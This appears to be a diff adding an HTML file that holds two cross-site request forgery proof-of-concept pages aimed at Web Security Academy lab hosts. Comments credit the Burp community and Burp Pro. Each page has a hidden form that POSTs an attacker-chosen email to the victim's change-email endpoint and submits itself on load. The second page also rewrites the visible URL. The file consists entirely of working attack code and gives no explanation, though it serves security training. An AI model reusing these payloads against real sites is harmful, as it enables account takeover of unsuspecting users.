@@ -1,0 +1,27 @@
+<!-- Script provided by Burb community was missing the method ="POST" -->
+
+<form method="POST" action="https://0a2600c004edb386c1ef363c007d00d1.web-security-academy.net/my-account/change-email" method="POST">
+    <input type="hidden" name="email" value="wrong@email.com">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+
+
+<!-- Second script created with burp pro -->
+<html>
+    <body>
+    <script>history.pushState('', '', '/')</script>
+        <form action="https://0a88008303ef90a9c019455200a70053.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="email" value="test@mail.com">
+        <input type="submit" value="Submit request" />
+    </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    
+    </body>
+
+
+
+</html>
